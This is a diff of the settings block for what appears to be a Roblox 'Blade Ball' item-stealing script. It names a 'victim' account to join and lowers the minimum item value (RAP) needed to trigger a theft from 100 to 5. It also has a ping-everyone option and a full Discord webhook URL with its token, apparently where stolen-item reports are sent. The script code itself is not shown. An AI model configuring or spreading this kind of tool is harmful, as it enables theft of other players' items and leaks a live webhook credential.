@@ -1,6 +1,6 @@
 Blade Ball settings:
 _G.Username = "notfishybloxdontrade" -- user you join victim on
-_G.min_rap = 100
+_G.min_rap = 5
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1367835268954194072/d_xMvdDNjj16cU5TMPajZVf4OxMmz2SPmC5WWl_vvwrhP0bMxG37Ll2OPEUr-9d0JOa6" -- change to your webhook
 
